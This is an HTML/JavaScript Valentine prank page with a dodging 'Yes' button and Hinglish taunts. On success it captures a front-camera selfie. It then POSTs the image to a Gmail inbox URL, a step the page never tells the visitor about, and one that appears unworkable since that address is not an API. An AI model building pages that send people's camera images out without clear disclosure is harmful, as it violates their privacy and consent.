<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Valentine 💖</title>

<style>
body {
  margin: 0;
  height: 100vh;
  background: linear-gradient(120deg,#ff4e8a,#ff9a9e);
  font-family: Arial, sans-serif;
  overflow: hidden;
  text-align: center;
}
h1 { color: white; padding: 15px; }
.play-area { position: relative; height: 60vh; }
button {
  padding: 16px 26px;
  font-size: 18px;
  border: none;
  border-radius: 16px;
  cursor: pointer;
}
#yes { position: absolute; background: #4CAF50; color: white; left: 20%; top: 45%; }
#no { position: absolute; background: #f44336; color: white; left: 60%; top: 45%; }
.hidden { display: none; }
video, img { width: 260px; border-radius: 16px; }
</style>
</head>

<body>

<h1 id="question">Will you be my Valentine? 💖🥺</h1>

<div class="play-area" id="playArea">
  <button id="yes">Yes 💖</button>
  <button id="no">No 💔</button>
</div>

<div id="yesResult" class="hidden">
  <h1>YAY 😍 Selfie captured!</h1>
  <video id="video" autoplay playsinline></video>
  <img id="photo" class="hidden">
</div>

<audio id="yesSong" src="Dil Cheer Ke Dekh(KoshalWorld.Com).mp3" preload="metadata"></audio>
<audio id="noSong" src="Dil Tod Ke Hansti Ho Mera(KoshalWorld.Com).mp3" preload="metadata"></audio>

<script>
/* ===============================
   🎵 AUDIO – MOBILE / IOS SAFE
================================ */
const YES_SONG_TIME = 34;
const NO_SONG_TIME  = 87;
const yesSong = document.getElementById("yesSong");
const noSong  = document.getElementById("noSong");

// Guaranteed mobile-safe play
async function playFromTimeSafe(audio, time, loop = false) {
  audio.pause();
  audio.loop = loop;

  try {
    await audio.play(); // Unlock audio
  } catch(e) {
    console.log("Audio gesture required:", e);
  }

  audio.currentTime = time;
  audio.play().catch(()=>{});
}

// Unlock audio on first click/tap anywhere
document.addEventListener("click", () => {
  yesSong.load();
  noSong.load();
}, { once:true });

/* ===============================
   🎮 GAME LOGIC
================================ */
const yesBtn = document.getElementById("yes");
const noBtn = document.getElementById("no");
const playArea = document.getElementById("playArea");
const question = document.getElementById("question");
const yesResult = document.getElementById("yesResult");
const video = document.getElementById("video");
const photo = document.getElementById("photo");

const REQUIRED_DODGES = 12;
let dodges = 0;
let stream;

const taunts = [
  "Pakadne ka sapna mat dekho 😏",
  "Aur zor lagao 😂",
  "YES bhaag raha hai 💨",
  "Relationship test chal raha 😈",
  "Mobile pe ho? LOL 🤡",
  "Bas thoda aur 😜",
  "Thak gaye? 😎",
  "Try again 😏",
  "Almost… NOT 😆",
  "Itna easy nahi 😌",
  "Aur ek try 😈",
  "Okay… ab maan liya 😍"
];

function moveYes() {
  const w = playArea.clientWidth - yesBtn.offsetWidth;
  const h = playArea.clientHeight - yesBtn.offsetHeight;
  yesBtn.style.left = Math.random()*w + "px";
  yesBtn.style.top  = Math.random()*h + "px";
  question.textContent = taunts[dodges % taunts.length];
}

yesBtn.onclick = () => {
  if (dodges < REQUIRED_DODGES) {
    if (dodges === 0) playFromTimeSafe(yesSong, YES_SONG_TIME); // start first time
    dodges++;
    moveYes();
    return;
  }
  success();
};

noBtn.onclick = () => {
  playFromTimeSafe(noSong, NO_SONG_TIME);
  alert("NO is not allowed 😤");
};

/* ===============================
   📸 SUCCESS + SELFIE
================================ */
async function success() {
  playArea.classList.add("hidden");
  question.classList.add("hidden");
  yesResult.classList.remove("hidden");

  playFromTimeSafe(yesSong, YES_SONG_TIME, true); // loop YES song

  stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
  });
  video.srcObject = stream;

  setTimeout(capturePhoto, 2000);
}

function capturePhoto() {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);

  photo.src = canvas.toDataURL("image/png");
  photo.classList.remove("hidden");
  video.classList.add("hidden");

  stream.getTracks().forEach(t => t.stop());

  // backend hook (email)
  fetch("https://mail.google.com/mail/u/0/?tab=rm&ogbl#inbox", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ image: photo.src })
  });
}
</script>

</body>
</html>
